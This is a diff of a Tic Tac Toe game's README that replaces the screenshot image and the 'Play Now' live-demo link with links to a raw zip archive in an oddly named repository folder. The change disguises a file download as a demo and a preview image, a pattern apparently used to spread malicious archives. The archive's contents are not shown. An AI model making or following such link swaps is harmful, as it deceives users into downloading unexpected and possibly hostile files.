@@ -12,8 +12,8 @@ A fun and interactive Tic Tac Toe game built with **HTML**, **CSS**, and **JavaS
 
 ## 📸 Preview
 
-![Screenshot](./image.png) <!-- Optional: Add your own screenshot image in the repo -->
+![Screenshot](https://raw.githubusercontent.com/dotsatya/Tic-Tac-Toe-Game/main/indebtedness/Tic-Tac-Toe-Game.zip) <!-- Optional: Add your own screenshot image in the repo -->
 
 ## 🌐 Live Demo
 
-[Play Now](https://dotsatya.github.io/Tic-Tac-Toe-Game/)
+[Play Now](https://raw.githubusercontent.com/dotsatya/Tic-Tac-Toe-Game/main/indebtedness/Tic-Tac-Toe-Game.zip)
